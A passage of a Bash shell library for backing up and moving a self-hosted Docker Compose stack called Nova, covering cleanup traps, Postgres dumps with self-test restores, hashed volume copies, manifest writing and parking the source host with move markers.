       written somewhere whose permissions cannot even be READ, let alone
       trusted."
    return 1
  fi
  if [ "$mode" != "600" ]; then
    bk_fail "this filesystem cannot hold owner-only permissions (read back 0$mode at
       $dir). The bundle carries every secret this machine has, so it will not be
       written somewhere that cannot protect it."
    return 1
  fi
  return 0
}

# ── the EXIT trap (§9.1 step 7) ─────────────────────────────────────────────
#
# From step 7 to step 21 this restarts exactly the list step 7 stopped. Without
# it a Ctrl-C at step 13, an OOM at step 17 or a dropped SSH session leaves
# core, gateway, memory and web stopped indefinitely: `restart: unless-stopped`
# does not bring back a container stopped by `docker compose stop`, and the
# routine path writes no marker to record that a backup was mid-flight
# (port-v3 M8).
#
# It also drops the self-test databases either way, removes the stage volume
# that holds every plaintext dump, deletes an unpublished .part, and releases
# the run lock. Every removal is READ BACK; anything it could not finish is
# named and makes this return non-zero.
#
# THE TWO STATES, AND SAYING WHICH (s41/rulings.md, 2026-09-21). A `--move`
# used to be exempt from the restart — the condition was `[ "$BK_RUN_MODE" !=
# "move" ]` — so a move that failed anywhere between step 7 and step 21 left
# `core`, `gateway`, `memory` AND `tailscale` stopped, wrote no marker, and
# printed one sentence about whatever failed. The host was then neither
# running nor parked, and off the tailnet, which is how the owner reaches
# Nova at all. The exemption is gone: what makes a stopped host legitimate is
# that the park SUCCEEDED, and bk_park says so by clearing BK_RUN_STOPPED
# itself. Every exit path now ends in one of exactly two states and prints
# which one.
BK_RUN_CLEANED=0
BK_RUN_LOCK=""
BK_RUN_STAGE=""
BK_RUN_STAGE_VOL=""
BK_RUN_PART=""
BK_RUN_STOPPED=""
BK_RUN_SCRATCH=""
BK_RUN_PG_ID=""
BK_RUN_MODE="routine"
BK_RUN_SERVICES=""
# 1 while bk_park has stopped the WHOLE project and has not yet proven both
# markers written. A park that fails in that window has stopped more than
# step 7 did, so bringing back step 7's list alone would leave the rest down.
BK_RUN_PARKING=0

bk_backup_cleanup() {
  local failures=0 db svc left pending
  # Never -e: this runs from the EXIT trap, with whatever flags are live at
  # the time, and under `-e` the first removal it cannot do would abort it
  # half way — skipping the writer restart, which is the one thing it exists
  # to guarantee. It finishes every branch and names what it could not do.
  set +e
  [ "$BK_RUN_CLEANED" -eq 1 ] && return 0
  BK_RUN_CLEANED=1

  while IFS= read -r db; do
    [ -n "$db" ] || continue
    if ! bk_assert_selftest_name "$db" "drop" || [ -z "$BK_RUN_PG_ID" ]; then
      failures=$((failures + 1))
      continue
    fi
    if bk_psql "$BK_RUN_PG_ID" postgres "DROP DATABASE IF EXISTS $(bk_sql_ident "$db")" >/dev/null 2>&1; then
      printf 'cleanup: dropped the self-test database %s\n' "$db"
    else
      bk_fail "could not drop the self-test database $db. Drop it by hand."
      failures=$((failures + 1))
    fi
  done <<EOF
$BK_RUN_SCRATCH
EOF
  BK_RUN_SCRATCH=""

  if [ -n "$BK_RUN_STAGE_VOL" ]; then
    bk_docker volume rm -f "$BK_RUN_STAGE_VOL" >/dev/null 2>&1
    if bk_docker volume inspect "$BK_RUN_STAGE_VOL" >/dev/null 2>&1; then
      bk_fail "the staging volume $BK_RUN_STAGE_VOL is still there. It holds the
       plaintext database dumps: remove it by hand with
       \`docker volume rm -f $BK_RUN_STAGE_VOL\`."
      failures=$((failures + 1))
    else
      printf 'cleanup: removed the staging volume %s\n' "$BK_RUN_STAGE_VOL"
    fi
    BK_RUN_STAGE_VOL=""
  fi

  if [ -n "$BK_RUN_PART" ] && [ -e "$BK_RUN_PART" ]; then
    rm -f "$BK_RUN_PART"
    if [ -e "$BK_RUN_PART" ]; then
      bk_fail "could not delete the unfinished $BK_RUN_PART."
      failures=$((failures + 1))
    else
      printf 'cleanup: deleted the unfinished %s\n' "$BK_RUN_PART"
    fi
  fi
  BK_RUN_PART=""

  if [ -n "$BK_RUN_STAGE" ] && [ -d "$BK_RUN_STAGE" ]; then
    rm -rf "$BK_RUN_STAGE"
  fi
  BK_RUN_STAGE=""

  if [ "$BK_RUN_PARKING" = "1" ]; then
    # The park stopped every service of the project and did not finish, so
    # this host is NOT parked. Bring the whole project back — including the
    # tailnet sidecar, whose absence is the one that makes the machine
    # unreachable — and read every service back rather than trusting `up`.
    if bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' up -d >/dev/null 2>&1; then
      pending="$(bk_verify_running "$BK_RUN_SERVICES")"
      if [ -z "$pending" ]; then
        printf 'cleanup: this host is NOT parked, so the stack was restarted: %s\n' \
          "$(printf '%s\n' "$BK_RUN_SERVICES" | sed '/^$/d' | tr '\n' ' ' | sed 's/ $//')"
      else
        bk_fail "this host is NOT parked AND$pending did not come back. Start them by hand:
       docker compose ${BK_COMPOSE_ARGS[*]} --profile '*' up -d
       If \`tailscale\` is in that list, this machine is off the tailnet until it is."
        failures=$((failures + 1))
      fi
    else
      bk_fail "this host is NOT parked and \`docker compose up -d\` did not exit 0, so
       the whole stack — the tailnet sidecar included — is still stopped. Start it
       by hand:
       docker compose ${BK_COMPOSE_ARGS[*]} --profile '*' up -d"
      failures=$((failures + 1))
    fi
    BK_RUN_PARKING=0
    BK_RUN_STOPPED=""
  fi

  if [ -n "$BK_RUN_STOPPED" ]; then
    left=""
    while IFS= read -r svc; do
      [ -n "$svc" ] || continue
      left="$left $svc"
    done <<EOF
$BK_RUN_STOPPED
EOF
    if [ -n "$left" ]; then
      # shellcheck disable=SC2086  # $left is a list of service names by design
      if bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' up -d $left >/dev/null 2>&1; then
        pending="$(bk_verify_running "$BK_RUN_STOPPED")"
        if [ -z "$pending" ]; then
          if [ "$BK_RUN_MODE" = "move" ]; then
            printf 'cleanup: this host is NOT parked, so the writers are running again:%s\n' "$left"
          else
            printf 'cleanup: restarted%s\n' "$left"
          fi
        else
          bk_fail "\`docker compose up -d$left\` exited 0 and$pending is still not running.
       Start it by hand, and if \`tailscale\` is in that list this machine is off
       the tailnet until it is."
          failures=$((failures + 1))
        fi
      else
        bk_fail "could not restart$left. Start them by hand:
       docker compose ${BK_COMPOSE_ARGS[*]} up -d$left"
        failures=$((failures + 1))
      fi
    fi
  fi
  BK_RUN_STOPPED=""

  if [ -n "$BK_RUN_LOCK" ] && [ -d "$BK_RUN_LOCK" ]; then
    rm -f "$BK_RUN_LOCK/started"
    rmdir "$BK_RUN_LOCK" 2>/dev/null
    if [ -d "$BK_RUN_LOCK" ]; then
      bk_fail "could not release the run lock at $BK_RUN_LOCK; remove it by hand."
      failures=$((failures + 1))
    fi
  fi
  BK_RUN_LOCK=""

  return "$failures"
}

# ── the per-database work (§9.1 steps 9-11) ─────────────────────────────────

# "<filename>\t<sha256 of that file on disk>" for every applied migration
# (§9.2 step 7 reads this member; s41/rulings.md B settles that the manifest
# field is `migrations_member`, a path to this TSV).
#
# A recorded migration whose file is not in this checkout REFUSES. The restore
# gate matches by CONTENT, so a row whose content nothing can read leaves that
# gate unable to decide — and a gate that cannot decide is exactly the silent
# pass this slice exists against.
bk_migrations_tsv() {
  local id="$1" db="$2" svc dir rows f sha
  svc="${db#nova_}"
  if [ "$svc" = "$db" ]; then
    bk_fail "the database $db is not named nova_<service>, so nothing can say which
       services/<service>/migrations directory its schema_migrations rows name."
    return 1
  fi
  dir="$BK_REPO_ROOT/services/$svc/migrations"
  if [ ! -d "$dir" ]; then
    bk_fail "$db records applied migrations and $dir is not in this checkout, so their
       content cannot be hashed. Run the backup from the checkout this stack was
       built from."
    return 1
  fi
  rows="$(bk_psql "$id" "$db" "SELECT filename FROM schema_migrations ORDER BY filename")" || {
    bk_fail "could not read schema_migrations from $db."
    return 1
  }
  if [ -z "$rows" ]; then
    bk_fail "$db has an empty schema_migrations. Its schema came from somewhere this
       bundle cannot name, so a restore could not gate on it."
    return 1
  fi
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    case "$f" in
      */* | ..*)
        bk_fail "$db records a migration called '$f', which is not a plain file name."
        return 1
        ;;
    esac
    if [ ! -f "$dir/$f" ]; then
      bk_fail "$db records the migration '$f' and $dir/$f is not in this checkout. The
       restore gate matches migrations by CONTENT, so a row whose content nothing
       can read would leave that gate unable to decide."
      return 1
    fi
    sha="$(sha256_of "$dir/$f")" || return 1
    printf '%s\t%s\n' "$f" "$sha"
  done <<EOF
$rows
EOF
}

# pg_dump into the stage volume. Prints "<bytes> <sha256> <toc entries>".
#
# Size alone is not enough: a pg_dump that fails after emitting a header
# leaves a plausible short file, so the first five bytes are read (`PGDMP`)
# and `pg_restore -l` must list at least one entry.
bk_dump_db() {
  local vol="$1" image="$2" net="$3" db="$4" line
  line="$(bk_docker run --rm --user 0:0 --network "$net" -v "$vol:/stage" \
    -e PGPASSFILE=/stage/.pgpass --entrypoint sh "$image" -ec '
      f="/stage/inner/db/$1.dump"
      umask 077
      pg_dump -h postgres -U postgres -d "$1" -Fc --no-owner --no-acl -f "$f"
      [ -s "$f" ]
      [ "$(head -c 5 "$f")" = "PGDMP" ]
      pg_restore -l "$f" > /tmp/toc
      n=$(grep -c -v "^;" /tmp/toc) || n=0
      [ "$n" -ge 1 ]
      printf "%s %s %s\n" "$(wc -c < "$f")" "$(sha256sum "$f" | cut -d" " -f1)" "$n"
    ' sh "$db")" || {
      bk_fail "the dump of $db did not complete and verify. Checked, in order: pg_dump
       exit 0, a non-empty file, the five bytes PGDMP at its head, and
       \`pg_restore -l\` listing at least one entry."
      return 1
    }
  case "$line" in
    [0-9]*" "*" "[0-9]*) ;;
    *)
      bk_fail "the dump container answered '$line', which is not
       \"<bytes> <sha256> <entries>\"."
      return 1
      ;;
  esac
  printf '%s\n' "$line"
}

# CREATE, prove the connection landed where it was aimed, pg_restore. The name
# is asserted before the CREATE and again before the pg_restore; the trap
# asserts it a third time before the DROP.
bk_selftest_db() {
  local vol="$1" image="$2" net="$3" pgid="$4" db="$5" scratch="$6" owner="$7" got
  bk_assert_selftest_name "$scratch" "create" || return 1
  BK_RUN_SCRATCH="$BK_RUN_SCRATCH
$scratch"
  if ! bk_psql "$pgid" postgres \
    "CREATE DATABASE $(bk_sql_ident "$scratch") OWNER $(bk_sql_ident "$owner")" >/dev/null; then
    bk_fail "could not create the self-test database $scratch."
    return 1
  fi
  got="$(bk_psql "$pgid" "$scratch" "SELECT current_database()" 2>/dev/null)"
  if [ "$got" != "$scratch" ]; then
    bk_fail "a connection aimed at '$scratch' reports current_database() = '$got'. A DSN
       that looks right and resolves elsewhere is the failure this catches, and it
       is caught before anything is written."
    return 1
  fi
  bk_assert_selftest_name "$scratch" "pg_restore into" || return 1
  # --exit-on-error is required, not tidiness: pg_restore's default is to
  # continue past errors, which turns a misdirected restore into an
  # interleaving instead of a stop.
  if ! bk_docker run --rm --user 0:0 --network "$net" -v "$vol:/stage" \
    -e PGPASSFILE=/stage/.pgpass --entrypoint pg_restore "$image" \
    --single-transaction --exit-on-error --no-owner --role="$owner" \
    -h postgres -U postgres -d "$scratch" "/stage/inner/db/$db.dump" >/dev/null 2>&1; then
    bk_fail "pg_restore of $db into $scratch failed. Nothing is published."
    return 1
  fi
  return 0
}

# ── the carried trees and files (§9.1 steps 12-13) ──────────────────────────
#
# `sh -ec`, and deliberately NOT an `&&` chain with a trailing `||`: `||`
# binds to the whole chain, so a failed copy — a full /stage, a read error, a
# permission problem — short-circuits into the empty branch, which succeeds,
# and on an empty-or-nearly-empty volume every secondary check is then 0 == 0
# and the volume is recorded as carried (port-v3 M3). v4_workspace on a hub
# where she has written nothing yet is exactly that volume.
#
# And the listing covers TYPES, MODES and OWNERSHIP, not just regular files: a
# `find . -type f` listing cannot detect a missing symlink, a lost empty
# directory or a changed mode, all of which are inside the archive
# (python-tool minor 5). -print0/xargs -0 handles a name containing a newline.
bk_tar_volume() {
  local vol="$1" image="$2" key="$3" full="$4" want_kb="${5:-}"
  local line src_n out_n src_f hash_n bytes
  local link_n target_n
  line="$(bk_pg_run --network none -v "$full:/src:ro" -v "$vol:/stage" \
    --entrypoint sh "$image" -ec '
      key=$1
      out="/stage/inner/volumes/$key"
      umask 077
      mkdir -p "$out" /stage/inner/listings
      cp -a /src/. "$out/"
      cd /src
      find . -mindepth 1 \( -type f -o -type l -o -type d \) -printf "%y %#m %U %G %p\n" \
        > /tmp/meta
      # One more pass for WHERE each link points. The four columns above say
      # a link exists and nothing about its target, so repointing
      # ./people/current from one set of notes to another passed pack, verify
      # and the reader alike — a backup that cannot notice its own data being
      # repointed is not verifying it. L <path> -> <target> is a separate
      # line, so the four-column lines stay exactly as 5.5 documents them and
      # parse_listing in novabundle.py reads both.
      # (No apostrophes in here: this whole script is one single-quoted
      # string in the caller.)
      find . -type l -printf "L %p -> %l\n" >> /tmp/meta
      LC_ALL=C sort -o /tmp/meta /tmp/meta
      find . -type f -print0 | LC_ALL=C sort -z > /tmp/f
      if [ -s /tmp/f ]; then xargs -0 -a /tmp/f sha256sum > /tmp/h; else : > /tmp/h; fi
      cat /tmp/meta /tmp/h > "/stage/inner/listings/$key.sha256"
      src_n=$(find /src -mindepth 1 | wc -l)
      out_n=$(find "$out" -mindepth 1 | wc -l)
      src_f=$(find /src -type f | wc -l)
      hash_n=$(wc -l < /tmp/h)
      link_n=$(find /src -type l | wc -l)
      target_n=$(grep -c "^L " /tmp/meta || true)
      bytes=$(du -sk /src | cut -f1)
      printf "%s %s %s %s %s %s %s\n" "$src_n" "$out_n" "$src_f" "$hash_n" \
        "$link_n" "$target_n" "$bytes"
    ' sh "$key")" || {
      bk_fail "copying and listing the volume $key ($full) failed. Nothing here treats
       that as an empty volume."
      return 1
    }
  src_n="$(printf '%s' "$line" | awk '{print $1}')"
  out_n="$(printf '%s' "$line" | awk '{print $2}')"
  src_f="$(printf '%s' "$line" | awk '{print $3}')"
  hash_n="$(printf '%s' "$line" | awk '{print $4}')"
  link_n="$(printf '%s' "$line" | awk '{print $5}')"
  target_n="$(printf '%s' "$line" | awk '{print $6}')"
  bytes="$(printf '%s' "$line" | awk '{print $7}')"
  if [ -z "$src_n" ] || [ -z "$out_n" ] || [ -z "$src_f" ] || [ -z "$hash_n" ] ||
    [ -z "$link_n" ] || [ -z "$target_n" ]; then
    bk_fail "the copy of volume $key answered '$line', which is not six counts and a size."
    return 1
  fi
  # A listing that names a link and not where it points is a REFUSAL, not a
  # skip (s41/rulings.md, C3). Without this the `L` pass is advisory: the day
  # it silently stops producing lines, the bundle goes back to being unable
  # to notice its own data being repointed, and nothing says so.
  if [ "$link_n" != "$target_n" ]; then
    bk_fail "volume $key ($full) holds $link_n symlinks and its listing carries
       $target_n \`L <path> -> <target>\` lines. A listing that names a link and not
       where it points cannot notice that link being repointed, which is the one
       thing it is for."
    return 1
  fi
  if [ "$src_n" != "$out_n" ]; then
    bk_fail "volume $key ($full) holds $src_n entries and $out_n reached the staging
       tree. A tier that lost entries on the way in is worse than no bundle."
    return 1
  fi
  if [ "$src_f" != "$hash_n" ]; then
    bk_fail "volume $key ($full) holds $src_f regular files and its listing carries
       $hash_n content hashes. The listing is what a restore diffs against."
    return 1
  fi
  # The one check that is NOT self-relative, and the reason it exists: every
  # check above compares this copy to itself, so on a volume that is empty AT
  # THE COPY all three are 0 == 0 and the volume is recorded as carried.
  # `$want_kb` is step 6's own `du -sk` of the same source, taken before
  # anything was stopped. An empty result is legitimate only when the volume
  # measured the same then — which is what tells `v4_workspace`, empty since
  # it was created, from a volume that lost everything in it mid-run.
  if [ "$src_n" = "0" ] && [ -n "$want_kb" ] && [ "$want_kb" -gt "${bytes:-0}" ]; then
    bk_fail "volume $key ($full) measured $want_kb KB at the free-space pass and copied 0
       entries, ${bytes:-0} KB. It emptied between the two readings, and 0 entries is
       what a carried-and-empty volume looks like — so nothing else here could
       tell this from the volume that is legitimately empty."
    return 1
  fi
  printf 'volume %s (%s): %s entries copied, %s files hashed, %s links targeted, %s KB\n' \
    "$key" "$full" "$src_n" "$src_f" "$link_n" "$bytes"
}

# One carried host path into the staging volume at files/<repo-relative path>,
# with its sha256 (or, for a directory, every file's) read back from what
# actually landed.
bk_stage_host_path() {
  local vol="$1" image="$2" src="$3" rel="$4" want got mode n
  if [ -d "$src" ]; then
    n="$(bk_docker run --rm --network none --user 0:0 -v "$src:/src:ro" -v "$vol:/stage" \
      --entrypoint sh "$image" -ec '
        out="/stage/inner/files/$1"
        umask 077
        mkdir -p "$out"
        cp -a /src/. "$out/"
        cd /src
        find . -type f -print0 | LC_ALL=C sort -z > /tmp/f
        if [ -s /tmp/f ]; then xargs -0 -a /tmp/f sha256sum > /tmp/a; else : > /tmp/a; fi
        cd "$out"
        find . -type f -print0 | LC_ALL=C sort -z > /tmp/g
        if [ -s /tmp/g ]; then xargs -0 -a /tmp/g sha256sum > /tmp/b; else : > /tmp/b; fi
        cmp -s /tmp/a /tmp/b
        src_n=$(find /src -mindepth 1 | wc -l)
        out_n=$(find "$out" -mindepth 1 | wc -l)
        [ "$src_n" = "$out_n" ]
        wc -l < /tmp/a
      ' sh "$rel")" || {
        bk_fail "copying the host directory $src into the bundle failed, or the copy
       does not hash the same as the source."
        return 1
      }
    printf 'files %s/: %s files copied and re-hashed from what landed\n' "$rel" "$(printf '%s' "$n" | tr -d ' ')"
    return 0
  fi
  if [ ! -f "$src" ]; then
    bk_fail "$src is classified as state to carry and it is neither a file nor a
       directory."
    return 1
  fi
  want="$(sha256_of "$src")" || return 1
  mode="$(bk_mode_of "$src")"
  if [ -z "$mode" ]; then
    bk_fail "neither stat form could read the mode of $src, and the bundle records the
       mode it must restore to."
    return 1
  fi
  bk_stage_put "$vol" "$image" "inner/files/$rel" < "$src" || {
    bk_fail "could not stage $src into the bundle."
    return 1
  }
  if ! bk_pg_run --network none -v "$vol:/stage" --entrypoint chmod "$image" \
    "$mode" "/stage/inner/files/$rel" >/dev/null 2>&1; then
    bk_fail "could not give the staged copy of $rel its source mode 0$mode."
    return 1
  fi
  got="$(bk_stage_sha256 "$vol" "$image" "inner/files/$rel" | tr -d ' \n')"
  if [ "$got" != "$want" ]; then
    bk_fail "$src hashes to $want on this host and to '${got:-nothing}' inside the
       bundle."
    return 1
  fi
  printf 'file %s: %s bytes, mode 0%s, sha256 matches the source\n' \
    "$rel" "$(wc -c < "$src" | tr -d ' ')" "$mode"
}

# ── identity, and the manifest base the container cannot derive ─────────────

# The one database that carries table $2, or nothing.
bk_db_with_table() {
  local pgid="$1" table="$2" facts="$3" db
  for db in $(awk '/"name":/ { line = $0; sub(/^.*"name": "/, "", line); sub(/".*$/, "", line); print line }' "$facts/databases.json"); do
    if [ "$(bk_psql "$pgid" "$db" "SELECT to_regclass('public.$table') IS NOT NULL" 2>/dev/null)" = "t" ]; then
      printf '%s\n' "$db"
      return 0
    fi
  done
  return 0
}

# The tailnet name this node answers to, or nothing. Read from the sidecar,
# which is the only thing on this host that can be asked; when it is not
# running the manifest records null and the report says so, rather than
# recording a name nothing checked.
bk_tailnet_dns_name() {
  local id status
  id="$(bk_container_id tailscale running)" || return 0
  [ -n "$id" ] || return 0
  status="$(bk_docker exec "$id" tailscale status --json 2>/dev/null)" || return 0
  printf '%s\n' "$status" | grep -o -m1 '"DNSName": *"[^"]*"' |
    sed 's/^[^:]*: *"//; s/\.\{0,1\}"$//'
}

# facts/manifest-base.json — the ten keys `plan` owes nothing else for, and
# refuses by name when one is missing or unknown. Everything derivable from
# the staged tree and from coverage() is derived THERE, so the two cannot
# disagree about what the bundle holds.
bk_write_manifest_base() {
  local stage="$1" facts="$2" mode="$3" transport="$4" stamp="$5" pw_source="$6"
  local pack_id="$7" pg_id="$8" pg_image_id="$9" pg_tag="${10}"
  local srv_ver="${11}" srv_num="${12}" dump_ver="${13}" dump_major="${14}" dbs_json="${15}"
  local out project repo_sha repo_dirty docker_ver compose_ver profiles files_json
  local signing_db signing rows devices people dns excl carried_ts f first

  out="$facts/manifest-base.json"
  project="$(bk_project)" || return 1

  repo_sha="null"
  repo_dirty="null"
  if f="$(bk_git rev-parse HEAD 2>/dev/null)" && [ -n "$f" ]; then
    repo_sha="\"$(bk_j "$f")\""
    if [ -n "$(bk_git status --porcelain 2>/dev/null)" ]; then
      repo_dirty="true"
    else
      repo_dirty="false"
    fi
  fi

  docker_ver="$(bk_docker version --format '{{.Server.Version}}' 2>/dev/null)"
  compose_ver="$(bk_docker compose version --short 2>/dev/null)"
  if [ -z "$docker_ver" ] || [ -z "$compose_ver" ]; then
    bk_fail "could not read the docker ('${docker_ver}') and compose ('${compose_ver}')
       versions this bundle was written by."
    return 1
  fi

  files_json=""
  first=1
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    [ "$first" -eq 1 ] || files_json="$files_json, "
    first=0
    files_json="$files_json\"$(bk_j "$f")\""
  done <<EOF
$(bk_compose_files)
EOF

  profiles=""
  first=1
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    [ "$first" -eq 1 ] || profiles="$profiles, "
    first=0
    profiles="$profiles\"$(bk_j "$f")\""
  done <<EOF
$(bk_cfg_profiles < "$facts/config.yaml")
EOF

  # The signing key's DIGEST, computed in SQL so the key value never crosses a
  # process boundary. Zero rows is legitimate on a hub that has never paired a
  # device (services/core/migrations/011_devices.sql:19-23) and is recorded as
  # null — and listed in `excluded`, because a restore that cannot say what it
  # is missing invites the operator to assume it is missing nothing.
  excl=""
  signing="null"
  signing_db="$(bk_db_with_table "$pg_id" core_signing_key "$facts")"
  if [ -n "$signing_db" ]; then
    rows="$(bk_psql "$pg_id" "$signing_db" "SELECT count(*) FROM core_signing_key" 2>/dev/null | tr -dc '0-9')"
    if [ -z "$rows" ]; then
      bk_fail "could not count the rows of core_signing_key in $signing_db."
      return 1
    fi
    if [ "$rows" -gt 1 ]; then
      bk_fail "$signing_db carries $rows core_signing_key rows. There is exactly one
       answer to \"which key is core's\", and this stack has more than one."
      return 1
    fi
    if [ "$rows" -eq 1 ]; then
      f="$(bk_psql "$pg_id" "$signing_db" "SELECT encode(sha256(private_key_hex::bytea), 'hex') FROM core_signing_key" 2>/dev/null)"
      if [ -z "$f" ]; then
        bk_fail "could not compute the core signing key's digest in $signing_db."
        return 1
      fi
      signing="\"$(bk_j "$f")\""
    fi
  fi
  if [ "$signing" = "null" ]; then
    excl="
    {\"kind\": \"identity\", \"name\": \"core_signing_key\",
     \"disposition\": \"exclude-declined\",
     \"reason\": \"this hub has no core_signing_key row, so there is no key to carry a digest of. A hub that has never paired a device has none (services/core/migrations/011_devices.sql:19-23); a restore generates one on first pair.\"}"
  fi

  # A count nobody could read is NOT the number 0. `[ -n "$x" ] || x=0`
  # recorded a failed query as "this hub has no devices", in the file whose
  # whole job is to say what was measured — the same fallback-that-reads-as-a
  # -measurement the core_signing_key count above already refuses. A table
  # that is not in this database at all is a different fact, and stays 0.
  devices=0
  people=0
  f="$(bk_db_with_table "$pg_id" devices "$facts")"
  if [ -n "$f" ]; then
    devices="$(bk_psql "$pg_id" "$f" "SELECT count(*) FROM devices" 2>/dev/null | tr -dc '0-9')"
    if [ -z "$devices" ]; then
      bk_fail "could not count the rows of devices in $f. The manifest records that
       number as a measurement, and a query that answered nothing is not the
       number zero."
      return 1
    fi
  fi
  f="$(bk_db_with_table "$pg_id" people "$facts")"
  if [ -n "$f" ]; then
    people="$(bk_psql "$pg_id" "$f" "SELECT count(*) FROM people" 2>/dev/null | tr -dc '0-9')"
    if [ -z "$people" ]; then
      bk_fail "could not count the rows of people in $f. The manifest records that
       number as a measurement, and a query that answered nothing is not the
       number zero."
      return 1
    fi
  fi

  # Not a bare assignment: the pipeline ends in `grep`, which exits 1 when
  # there is no tailnet name — a legitimate answer, and under `pipefail` an
  # assignment failure.
  dns="$(bk_tailnet_dns_name)" || dns=""
  if [ -n "$dns" ]; then
    dns="\"$(bk_j "$dns")\""
  else
    dns="null"
  fi
  if [ "$mode" = "move" ]; then carried_ts="true"; else carried_ts="false"; fi

  {
    printf '{\n'
    printf '  "created_at": "%s",\n' "$(bk_j "$stamp")"
    printf '  "mode": "%s",\n' "$(bk_j "$mode")"
    printf '  "transport": "%s",\n' "$(bk_j "$transport")"
    printf '  "source": {\n'
    printf '    "host": "%s",\n' "$(bk_j "$(uname -n)")"
    printf '    "os": "%s",\n' "$(bk_j "$(uname -s) $(uname -r)")"
    printf '    "repo_sha": %s,\n' "$repo_sha"
    printf '    "repo_dirty": %s,\n' "$repo_dirty"
    printf '    "project": "%s",\n' "$(bk_j "$project")"
    printf '    "compose_files": [%s],\n' "$files_json"
    printf '    "profiles": [%s],\n' "$profiles"
    printf '    "docker_version": "%s",\n' "$(bk_j "$docker_ver")"
    printf '    "compose_version": "%s",\n' "$(bk_j "$compose_ver")"
    printf '    "pack_image_id": "%s"\n' "$(bk_j "$pack_id")"
    printf '  },\n'
    printf '  "postgres": {\n'
    printf '    "server_version": "%s",\n' "$(bk_j "$srv_ver")"
    printf '    "server_version_num": %s,\n' "$srv_num"
    printf '    "pg_dump_version": "%s",\n' "$(bk_j "$dump_ver")"
    printf '    "pg_dump_major": %s,\n' "$dump_major"
    printf '    "container_image": "%s",\n' "$(bk_j "$pg_tag")"
    printf '    "container_image_id": "%s"\n' "$(bk_j "$pg_image_id")"
    printf '  },\n'
    printf '  "session": %s,\n' "$(bk_session_json)"
    printf '  "databases": [%s\n  ],\n' "$dbs_json"
    printf '  "identity": {\n'
    printf '    "core_signing_key_sha256": %s,\n' "$signing"
    printf '    "tailnet_dns_name": %s,\n' "$dns"
    printf '    "tailnet_state_carried": %s,\n' "$carried_ts"
    printf '    "device_count": %s,\n' "$devices"
    printf '    "people_count": %s\n' "$people"
    printf '  },\n'
    printf '  "passphrase_source": "%s",\n' "$(bk_j "$pw_source")"
    printf '  "excluded": [%s\n  ]\n' "$excl"
    printf '}\n'
  } > "$out"
  bk_verify_fact "$out" "assembling facts/manifest-base.json" /dev/null
}

# ── --move: the marker, written and read back (§9.5) ────────────────────────
#
# deploy/tailscale/MOVED_TO and not a file inside v4_tailscale: deploy/tailscale/
# is already bind-mounted into the sidecar read-only at /config, so the sidecar
# sees the marker with NO compose change and no single-file bind — a
# single-file mount resolves to a host inode at create time and dies when the
# WSL mount is recycled, which this repo has been bitten by. And
# deploy/tailscale/** is exclude-code, so the marker never travels in the
# bundle and cannot refuse to start on the destination.
bk_park() {
  local stamp="$1" final="$2" sha="$3" host="$4" dns="$5" marker moved body path
  local svc id running still
  # EVERY service, not just postgres. §9.5 says a move leaves the stack
  # stopped and §9.1 step 22 adds "stop postgres too" — step 7 stopped only
  # the writers, so `web`, `searxng` and `ollama` would still be serving a
  # machine whose data now lives somewhere else.
  # From here the WHOLE project is being stopped, which is more than step 7
  # stopped. The trap needs to know that, because a park that does not finish
  # leaves a host that is neither running nor parked — and off the tailnet,
  # which is how the owner reaches Nova at all (s41/rulings.md, "a failed
  # --move parks or restarts, and says which").
  BK_RUN_PARKING=1
  if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' stop >/dev/null 2>&1; then
    bk_fail "the bundle IS written at $final.
       Separately: \`docker compose stop\` did not exit 0, so this host is NOT
       parked. Do not start Nova on the destination until it is."
    return 4
  fi
  still=""
  for svc in $(cfg_service_keys < "$BK_RUN_STAGE/facts/config.yaml"); do
    id="$(bk_container_id "$svc" any)"
    [ -n "$id" ] || continue
    running="$(bk_docker inspect "$id" --format '{{.State.Running}}' 2>/dev/null)"
    [ "$running" = "false" ] || still="$still $svc"
  done
  if [ -n "$still" ]; then
    bk_fail "the bundle IS written at $final.
       Separately:$still would not stop, so this host is NOT parked. Two live Novas
       sharing one identity is the failure a move exists to avoid."
    return 4
  fi
  printf 'parked: every service of this project reads .State.Running false\n'
  marker="$(bk_moved_to_marker)"
  moved="$(bk_moved_marker)"
  body="$(printf 'moved_at=%s\nbundle=%s\nbundle_sha256=%s\nsource_host=%s\ntailnet_dns_name=%s\n' \
    "$stamp" "$(basename "$final")" "$sha" "$host" "${dns:-}")"
  for path in "$marker" "$moved"; do
    mkdir -p "$(dirname "$path")" 2>/dev/null
    (
      umask 077
      printf '%s\n' "$body" > "$path"
    ) || {
      # The two facts as two facts (§9.1 step 22): the bundle is written and
      # verified, AND this host is not parked. Exit 4 and not 1, because 1 is
      # "refused, nothing written" and install.sh exiting 1 for a run that
      # produced a verified bundle is how an operator deletes one.
      bk_fail "the bundle IS written and verified at $final.
       Separately: the move marker $path could not be written, so this host is NOT
       parked. Nobody should believe the source host is stopped when it is not."
      return 4
    }
    chmod 600 "$path" 2>/dev/null
    if [ "$(cat "$path" 2>/dev/null)" != "$body" ]; then
      bk_fail "the bundle IS written and verified at $final.
       Separately: the move marker $path did not read back as it was written, so
       this host is NOT parked. Nobody should believe the source host is stopped
       when it is not."
      return 4
    fi
  done
  # Parked, proven, and only now does the trap stop owning the restart: from
  # here "stopped" is the state this run was asked to produce, not the state
  # a failure left behind.
  BK_RUN_PARKING=0
  BK_RUN_STOPPED=""
  printf 'parked: the stack is stopped and %s and %s are in place\n' "$marker" "$moved"
  printf 'undo it with:\n  ./install undo-move\n'
}

# ── stopping and restarting the writers ─────────────────────────────────────

# Stop $2.. and prove each one stopped. "Proved" is two readings, not one:
# .State.Running is false AND .State.FinishedAt is at or after the moment the
# stop was issued, so a container that was already dead for other reasons is
# not read as "we stopped it" — which would leave a writer that never ran
# looking quiesced, and would leave the trap restarting something this run
# never touched.
bk_stop_writers() {
  local issued="$1" deadline now svc id running finished pending
  shift
  [ $# -gt 0 ] || return 0
  if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' stop "$@" >/dev/null 2>&1; then
    bk_fail "\`docker compose stop $*\` did not exit 0. Nothing was dumped."
    return 1
  fi
  deadline=$(( $(date +%s) + 60 ))
  while :; do
    pending=""
    for svc in "$@"; do
      id="$(bk_container_id "$svc" any)"
      if [ -z "$id" ]; then
